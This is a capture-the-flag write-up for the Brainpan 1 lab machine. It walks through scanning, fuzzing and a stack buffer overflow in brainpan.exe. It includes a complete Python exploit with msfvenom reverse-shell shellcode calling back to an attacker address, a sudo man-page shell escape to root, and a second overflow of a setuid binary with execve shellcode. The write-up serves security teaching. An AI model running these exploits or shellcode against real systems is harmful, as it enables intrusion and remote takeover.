#  Brainpan: 1

One of the best buffer overflow VM's. We netdiscover to find `192.168.1.98` and do an nmap scan.

```
root@kali:~# nmap -p- -T4 -A 192.168.1.98 
Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-01 23:00 BST
Nmap scan report for brainpan.home (192.168.1.98)
Host is up (0.00051s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.60%I=7%D=10/1%Time=59D16AC4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:34:5C:F0 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms brainpan.home (192.168.1.98)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1381.08 seconds
```

We visit the ports `http://192.168.1.98:9999/` and `http://192.168.1.98:10000/`. The latter is more interestinig as we can run nikto to find a folder `/bin`. Visiting that gives us brainpan.exe which we can execute on Windows. This seems to host a server at port 9999. When we nc to the windows vm, we see that `nc 192.168.1.76 9999` it asks for a password and it gets copied into the buffer. Furthermore, checking `strings brainpan.exe` showed that strcpy was used, indicated a buffer overflow attack.

## Buffer Overflow
Using the a modified fuzzer from rgolebiowski and blogpost by offsec https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/. We can use immunity debugger or IDA. When using IDA, we have to set the debugger to `Local Win32 debugger`.

```
import socket
import time

for i in range(10):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.76', 9999))
    payload = "\x41"*100*i


    s.send(payload)
    print("sent {}".format(len(payload)))
    time.sleep(1)
    s.close()
```

We see that the buffer stops at 600. So we know that it is between 600 and 500.

```
...
...
[get_reply] copied 500 bytes to buffer                                                                                  [+] received connection.                                                                                                [get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
[get_reply] copied 600 bytes to buffer       
```

Now back to our attacker's machine, Kali Linux

```
root@kali:/usr/share/metasploit-framework/tools/exploit# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

root@kali:~/test# nc 192.168.1.76 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

(now on IDA, we see that we have overwritten the EIP with address pointer 35724134. We can offset this)

root@kali:/usr/share/metasploit-framework/tools/exploit# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524 <--------- we need 524 bytes!
```

Now we can generate our exploit, we can check if its OK by changing out payload to something like ` "A"*524 + "B"*4 + (500)*"C` as it is `BUFFER | EBP | ESP`. The C is to check if we have enough space for our planned shellcode. All we have to do is **[524 bytes JUNK | 4 byte EIP (Where EBP is, so that our eip, next instruction, will jump to ESP) | some NOPSLED | SHELLCODE]**. We can find JMP ESP address on IDA by just using search > find text and find all occurrences and right clicking the address section and find command in Immunity. Now we need to generate our shellcode. I was testing this on a Windows XP VM, my mistake was forgetting to change the payload architecture option to 32 bits! Remember to add this if you attacking the 32-bit machine. Note, this also worked on a Windows 10

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.88 LPORT=1234 -f python -b "\x00" -a x86 --platform Windows
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1684 bytes
buf =  ""
buf += "\xbb\x98\x42\x03\x0c\xd9\xcb\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x70\xbe\xe1"
buf += "\xf9\x7c\xd7\x64\x01\x7c\x28\x09\x8b\x99\x19\x09\xef"
buf += "\xea\x0a\xb9\x7b\xbe\xa6\x32\x29\x2a\x3c\x36\xe6\x5d"
buf += "\xf5\xfd\xd0\x50\x06\xad\x21\xf3\x84\xac\x75\xd3\xb5"
buf += "\x7e\x88\x12\xf1\x63\x61\x46\xaa\xe8\xd4\x76\xdf\xa5"
buf += "\xe4\xfd\x93\x28\x6d\xe2\x64\x4a\x5c\xb5\xff\x15\x7e"
buf += "\x34\xd3\x2d\x37\x2e\x30\x0b\x81\xc5\x82\xe7\x10\x0f"
buf += "\xdb\x08\xbe\x6e\xd3\xfa\xbe\xb7\xd4\xe4\xb4\xc1\x26"
buf += "\x98\xce\x16\x54\x46\x5a\x8c\xfe\x0d\xfc\x68\xfe\xc2"
buf += "\x9b\xfb\x0c\xae\xe8\xa3\x10\x31\x3c\xd8\x2d\xba\xc3"
buf += "\x0e\xa4\xf8\xe7\x8a\xec\x5b\x89\x8b\x48\x0d\xb6\xcb"
buf += "\x32\xf2\x12\x80\xdf\xe7\x2e\xcb\xb7\xc4\x02\xf3\x47"
buf += "\x43\x14\x80\x75\xcc\x8e\x0e\x36\x85\x08\xc9\x39\xbc"
buf += "\xed\x45\xc4\x3f\x0e\x4c\x03\x6b\x5e\xe6\xa2\x14\x35"
buf += "\xf6\x4b\xc1\x9a\xa6\xe3\xba\x5a\x16\x44\x6b\x33\x7c"
buf += "\x4b\x54\x23\x7f\x81\xfd\xce\x7a\x42\xc2\xa7\x85\xca"
buf += "\xaa\xb5\x85\xee\xf8\x33\x63\x84\xec\x15\x3c\x31\x94"
buf += "\x3f\xb6\xa0\x59\xea\xb3\xe3\xd2\x19\x44\xad\x12\x57"
buf += "\x56\x5a\xd3\x22\x04\xcd\xec\x98\x20\x91\x7f\x47\xb0"
buf += "\xdc\x63\xd0\xe7\x89\x52\x29\x6d\x24\xcc\x83\x93\xb5"
buf += "\x88\xec\x17\x62\x69\xf2\x96\xe7\xd5\xd0\x88\x31\xd5"
buf += "\x5c\xfc\xed\x80\x0a\xaa\x4b\x7b\xfd\x04\x02\xd0\x57"
buf += "\xc0\xd3\x1a\x68\x96\xdb\x76\x1e\x76\x6d\x2f\x67\x89"
buf += "\x42\xa7\x6f\xf2\xbe\x57\x8f\x29\x7b\x67\xda\x73\x2a"
buf += "\xe0\x83\xe6\x6e\x6d\x34\xdd\xad\x88\xb7\xd7\x4d\x6f"
buf += "\xa7\x92\x48\x2b\x6f\x4f\x21\x24\x1a\x6f\x96\x45\x0f"

```

Now putting this all together in a python file.

```
import socket
import time

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.99', 9999))

junk = "\x41"*524
eip = "\xf3\x12\x17\x31" 
nops = "\x90" * 48
buf =  ""
buf += "\xbb\x98\x42\x03\x0c\xd9\xcb\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x70\xbe\xe1"
buf += "\xf9\x7c\xd7\x64\x01\x7c\x28\x09\x8b\x99\x19\x09\xef"
buf += "\xea\x0a\xb9\x7b\xbe\xa6\x32\x29\x2a\x3c\x36\xe6\x5d"
buf += "\xf5\xfd\xd0\x50\x06\xad\x21\xf3\x84\xac\x75\xd3\xb5"
buf += "\x7e\x88\x12\xf1\x63\x61\x46\xaa\xe8\xd4\x76\xdf\xa5"
buf += "\xe4\xfd\x93\x28\x6d\xe2\x64\x4a\x5c\xb5\xff\x15\x7e"
buf += "\x34\xd3\x2d\x37\x2e\x30\x0b\x81\xc5\x82\xe7\x10\x0f"
buf += "\xdb\x08\xbe\x6e\xd3\xfa\xbe\xb7\xd4\xe4\xb4\xc1\x26"
buf += "\x98\xce\x16\x54\x46\x5a\x8c\xfe\x0d\xfc\x68\xfe\xc2"
buf += "\x9b\xfb\x0c\xae\xe8\xa3\x10\x31\x3c\xd8\x2d\xba\xc3"
buf += "\x0e\xa4\xf8\xe7\x8a\xec\x5b\x89\x8b\x48\x0d\xb6\xcb"
buf += "\x32\xf2\x12\x80\xdf\xe7\x2e\xcb\xb7\xc4\x02\xf3\x47"
buf += "\x43\x14\x80\x75\xcc\x8e\x0e\x36\x85\x08\xc9\x39\xbc"
buf += "\xed\x45\xc4\x3f\x0e\x4c\x03\x6b\x5e\xe6\xa2\x14\x35"
buf += "\xf6\x4b\xc1\x9a\xa6\xe3\xba\x5a\x16\x44\x6b\x33\x7c"
buf += "\x4b\x54\x23\x7f\x81\xfd\xce\x7a\x42\xc2\xa7\x85\xca"
buf += "\xaa\xb5\x85\xee\xf8\x33\x63\x84\xec\x15\x3c\x31\x94"
buf += "\x3f\xb6\xa0\x59\xea\xb3\xe3\xd2\x19\x44\xad\x12\x57"
buf += "\x56\x5a\xd3\x22\x04\xcd\xec\x98\x20\x91\x7f\x47\xb0"
buf += "\xdc\x63\xd0\xe7\x89\x52\x29\x6d\x24\xcc\x83\x93\xb5"
buf += "\x88\xec\x17\x62\x69\xf2\x96\xe7\xd5\xd0\x88\x31\xd5"
buf += "\x5c\xfc\xed\x80\x0a\xaa\x4b\x7b\xfd\x04\x02\xd0\x57"
buf += "\xc0\xd3\x1a\x68\x96\xdb\x76\x1e\x76\x6d\x2f\x67\x89"
buf += "\x42\xa7\x6f\xf2\xbe\x57\x8f\x29\x7b\x67\xda\x73\x2a"
buf += "\xe0\x83\xe6\x6e\x6d\x34\xdd\xad\x88\xb7\xd7\x4d\x6f"
buf += "\xa7\x92\x48\x2b\x6f\x4f\x21\x24\x1a\x6f\x96\x45\x0f"


payload = junk + eip + nops + buf
s.send(payload)
print("sent {}".format(len(payload)))
s.close()
```

Running this script, with attacker vm `nc -lvp 1234` and brainpan.exe running in Windows XP, I should get a shell to my Windows VM. Great! It works, now just need to change the IP and payload for our Brainpan server which we know runs on Linux through nmap. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.88 LPORT=1234 -f python -b "\x00"` works giving us a windows shell or `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.88 LPORT=1234 -f python -b "\x00"` too, just to note.

## Privilege Escalation

### Method 1 - sudo -l man workaround

```
root@kali:~/test# nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.1.88] from brainpan.home [192.168.1.98] 44357
python -c 'import pty; pty.spawn("/bin/bash")'
puck@brainpan:/$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

puck@brainpan:/$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]

puck@brainpan:/$ sudo /home/anansi/bin/anansi_util manual nano
sudo /home/anansi/bin/anansi_util manual nano
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
NANO(1)                                                                NANO(1)

NAME
       nano - Nano's ANOther editor, an enhanced free Pico clone

SYNOPSIS
       nano [OPTIONS] [[+LINE,COLUMN] FILE]...

DESCRIPTION
       This manual page briefly documents the nano command.

       nano  is  a small, free and friendly editor which aims to replace Pico,
       the default editor included in the non-free Pine package.  Rather  than
       just  copying  Pico's  look and feel, nano also implements some missing
       (or disabled by default) features in Pico, such as "search and replace"
       and "go to line and column number".

OPTIONS
       +LINE,COLUMN
              Places  cursor  at line number LINE and column number COLUMN (at
              least one of which must be specified) on startup, instead of the
              default of line 1, column 1.

 Manual page nano(1) line 1 (press h for help or q to quit)!/bin/bash 
!/bin/bash
root@brainpan:/usr/share/man# whoami
whoami
root

```

The - manual [command] part stands out and we can run root privileges with that. We now open vi where we execute inline commands, brilliant exploit found on http://zeronteproject.com/119/.

```
3. Test commands without leaving the man page. Another cool trick is to use ! if you want to try something you just read in the man page. The best part is that you don't have to close the man page or open another terminal. Type ! and next type the command you want to try. Once finished hit Enter to go back to the man page.
```


### Method 2 - buffer overflow workaround

Another way is to find suid binaries. We find a file called validate owned by anansi. If we can spawn a shell as her, we can change anansi/bin/anansi_util to execute our own anansi_util that spawns a shell as root instead. This is of course a lot longer, but works just as fine.

```
puck@brainpan:/home/puck$ find / -perm +6000 -type f -exec ls -ld {} \; 2>&1 | grep -v "Permission denied"
<-exec ls -ld {} \; 2>&1 | grep -v "Permission denied"                       
-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39124 Oct  2  2012 /bin/ping6
-rwsr-xr-x 1 root root 34780 Oct  2  2012 /bin/ping
-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
-rwsr-xr-x 2 root root 115140 Feb 27  2013 /usr/bin/sudo
-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
-rwsr-xr-x 2 root root 115140 Feb 27  2013 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
-rwxr-sr-x 3 root mail 9704 Oct  2  2012 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 14020 Oct  2  2012 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
-rwsr-xr-x 1 root lpadmin 13672 Dec  4  2012 /usr/bin/lppasswd
-rwxr-sr-x 3 root mail 9704 Oct  2  2012 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
-rwxr-sr-x 3 root mail 9704 Oct  2  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate <----------------- what's this?
-rwsr-xr-- 1 root messagebus 317564 Oct  3  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9740 Oct  3  2012 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd
find: `/proc/2177/task/2177/fd/5': No such file or directory
find: `/proc/2177/task/2177/fdinfo/5': No such file or directory
find: `/proc/2177/fd/5': No such file or directory
find: `/proc/2177/fdinfo/5': No such file or directory
```

There is a file ` /usr/local/bin/validate` is of interest. In fact, `strings validate` shows a possible buffer overflow. I `nc 192.168.1.88 1234 < validate` over to my attacker `nc -lvp 1234 > validate`.

```
root@kali:~/test# ./validate `python -c 'print "\x41"*120'`
Segmentation fault

root@kali:~/test# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

root@kali:~/test# gdb -q validate
Reading symbols from validate...done.
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
Starting program: /root/test/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd138 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9")
EBX: 0x41366441 ('Ad6A')
ECX: 0xffffd4a0 ("Ad5Ad6Ad7Ad8Ad9")
EDX: 0xffffd1a1 ("Ad5Ad6Ad7Ad8Ad9")
ESI: 0x2 
EDI: 0xf7f70000 --> 0x1b2db0 
EBP: 0x64413764 ('d7Ad')
ESP: 0xffffd1b0 --> 0xffffd400 --> 0x0 
EIP: 0x39644138 ('8Ad9')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x39644138
[------------------------------------stack-------------------------------------]
0000| 0xffffd1b0 --> 0xffffd400 --> 0x0 
0004| 0xffffd1b4 --> 0xf7f70000 --> 0x1b2db0 
0008| 0xffffd1b8 --> 0x0 
0012| 0xffffd1bc --> 0xf7deba3b (<__cxa_atexit+27>:	add    esp,0x10)
0016| 0xffffd1c0 --> 0xf7f703dc --> 0xf7f711e0 --> 0x0 
0020| 0xffffd1c4 --> 0x8048204 --> 0x48 ('H')
0024| 0xffffd1c8 --> 0x80485bb (<__libc_csu_init+11>:	add    ebx,0x1a39)
0028| 0xffffd1cc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x39644138 in ?? ()         <-------------------------- offset value
gdb-peda$ quit

root@kali:~/test# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138
[*] Exact match at offset 116

gdb-peda$ r `python -c 'print("A"*116 + "B"*4 + "C"*50)'` <----------------------------- works perfectly (instead of finding esp, we will store the shellcode in the buffer, so we will call eax instead)
Starting program: /root/test/validate `python -c 'print("A"*116 + "B"*4 + "C"*50)'`

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd108 ('A' <repeats 116 times>, "BBBB", 'C' <repeats 50 times>)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd4a0 ('C' <repeats 15 times>)
EDX: 0xffffd1a3 ('C' <repeats 15 times>)
ESI: 0x2 
EDI: 0xf7eab000 --> 0x1b2db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd180 ('C' <repeats 50 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd180 ('C' <repeats 50 times>)
0004| 0xffffd184 ('C' <repeats 46 times>)
0008| 0xffffd188 ('C' <repeats 42 times>)
0012| 0xffffd18c ('C' <repeats 38 times>)
0016| 0xffffd190 ('C' <repeats 34 times>)
0020| 0xffffd194 ('C' <repeats 30 times>)
0024| 0xffffd198 ('C' <repeats 26 times>)
0028| 0xffffd19c ('C' <repeats 22 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 

(side note on how to obtain the return address foor CALL EAX)
root@kali:~/test# objdump -d validate |grep call|grep eax 
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax <----------------- use this return address
 804862b:	ff d0                	call   *%eax

gdb-peda$ r `python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90"*83 + "\xaf\x84\x04\x08"*4)'`
Starting program: /bin/dash `python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90"*83 + "\xaf\x84\x04\x08"*4)'`
/bin/dash: 0: Can't open j
                          X�Rfh-p��Rjhh/bash/bin��RQS��̀�������������������������������������������������������������������������������������������
[Inferior 2 (process 2526) exited with code 0177]
Warning: not running or target is remote

(IT WORKS! Now back to our reverse shell earlier)

